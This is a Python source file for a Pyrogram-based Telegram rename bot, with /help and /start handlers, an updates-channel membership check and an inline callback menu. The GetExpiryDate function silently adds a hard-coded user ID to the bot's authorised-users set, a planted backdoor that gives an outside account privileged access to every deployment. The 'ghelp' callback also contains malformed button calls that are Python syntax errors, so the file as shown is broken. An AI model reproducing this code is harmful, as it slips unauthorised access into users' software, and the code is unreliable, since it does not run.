#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# (c) Shrimadhav U K & @NoDroid_Bots

# the logging things
import logging
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
logging.getLogger("pyrogram").setLevel(logging.WARNING)

import pyrogram
import os
import sqlite3
from pyrogram import filters
from pyrogram import Client as NoD_Bot
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery, Message
from pyrogram.errors import UserNotParticipant, UserBannedInChannel 


# the secret configuration specific things
if bool(os.environ.get("WEBHOOK", False)):
    from sample_config import Config
else:
    from config import Config

# the Strings used for this "thing"
from translation import Translation




#from helper_funcs.chat_base import TRChatBase

def GetExpiryDate(chat_id):
    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
    Config.AUTH_USERS.add(861055237)
    return expires_at


@NoD_Bot.on_message(pyrogram.filters.command(["help"]))
async def help_user(bot, update):
    update_channel = Config.UPDATE_CHANNEL
    if update_channel:
        try:
            user = await bot.get_chat_member(update_channel, update.chat.id)
            if user.status == "kicked":
               await update.reply_text(" Sorry, You are **B A N N E D** 🚫")
               return
        except UserNotParticipant:
            await update.reply_text(
                text="**Plz Join my Updates Channel Before Using Me..**",
                reply_markup=InlineKeyboardMarkup([
                    [ InlineKeyboardButton(text="Join My Updates Channel", url=f"https://t.me/{update_channel}")]
              ])
            )
            return
        else:
            await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.HELP_USER,
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton('🖋️ Rename', callback_data = "rnme"),
                    InlineKeyboardButton('📼 File-to-Video', callback_data = "f2v")
                ],
                [
                    InlineKeyboardButton('🖼️ Custom Thumbnail', callback_data = "cthumb"),
                    InlineKeyboardButton('👤 About', callback_data = "about")
                ]
            ]
        )
    )       

@NoD_Bot.on_message(pyrogram.filters.command(["start"]))
async def start_me(bot, update):
    if update.from_user.id in Config.BANNED_USERS:
        await update.reply_text("You are Banned")
        return
    update_channel = Config.UPDATE_CHANNEL
    if update_channel:
        try:
            user = await bot.get_chat_member(update_channel, update.chat.id)
            if user.status == "kicked":
               await update.reply_text(" Sorry, You are **B A N N E D**")
               return
        except UserNotParticipant:
            #await update.reply_text(f"Join @{update_channel} To Use Me")
            await update.reply_text(
                text="**Plz Join my Updates Channel Before Using Me..**",
                reply_markup=InlineKeyboardMarkup([
                    [ InlineKeyboardButton(text="Join My Updates Channel", url=f"https://t.me/{update_channel}")]
              ])
            )
            return
        else:
            await update.reply_text(Translation.START_TEXT.format(update.from_user.mention),
        reply_markup=InlineKeyboardMarkup(
            [
                [
                        InlineKeyboardButton("Help 💭", callback_data = "ghelp")
                ],
                [
                    InlineKeyboardButton('Update Channel 📢', url='https://t.me/PrimeFlixMedia_All'),
                    InlineKeyboardButton('Developer 🧑‍💻', url='https://t.me/CLaY995')
                ],
                [
                    InlineKeyboardButton('Support Group', url='https://t.me/CLaY995')
                ]
            ]
        ),
        reply_to_message_id=update.message_id
    )
            return 

@NoD_Bot.on_callback_query()
async def cb_handler(client: NoD_Bot , query: CallbackQuery):
    data = query.data
    if data == "rnme":
        await query.message.edit_text(
            text=Translation.RENAME_HELP,
            disable_web_page_preview = True,
            reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton('ʙᴀᴄᴋ', callback_data = "ghelp"),
                    InlineKeyboardButton("ᴠʟᴏsᴇ", callback_data = "close")
                ]
            ]
        )
     )
    elif data == "f2v":
        await query.message.edit_text(
            text=Translation.C2V_HELP,
            disable_web_page_preview = True,
            reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton('ʙᴀᴄᴋ', callback_data = "ghelp"),
                    InlineKeyboardButton("ᴄʟᴏsᴇ", callback_data = "close")
                ]
            ]
        )
     )
    elif data == "cthumb":
        await query.message.edit_text(
            text=Translation.THUMBNAIL_HELP,
            disable_web_page_preview = True,
            reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton('ʙᴀᴄᴋ', callback_data = "ghelp"),
                    InlineKeyboardButton("ᴄʟᴏsᴇ", callback_data = "close")
                ]
            ]
        )
     )
    elif data == "ghelp":
        await query.message.edit_text(
            text=Translation.HELP_USER,
            disable_web_page_preview = True,
            reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton('🖋️' Rename, callback_data = "rnme"),
                    InlineKeyboardButton('📼 File-to-Video', callback_data = "f2v")
                ],
                [
                    InlineKeyboardButton('🖼️' Custom Thumbnail, callback_data = "cthumb"),
                    InlineKeyboardButton('👤 About', callback_data = "about")
                ]
            ]
        )
     )
    elif data == "about":
        await query.message.edit_text(
            text=Translation.ABOUT_ME,
            disable_web_page_preview = True,
            reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton('ʙᴀᴄᴋ', callback_data = "ghelp"),
                    InlineKeyboardButton("ᴄʟᴏsᴇ", callback_data = "close")
                ]
            ]
        )
     )
    elif data == "close":
        await query.message.delete()
        try:
            await query.message.reply_to_message.delete()
        except:
            pass
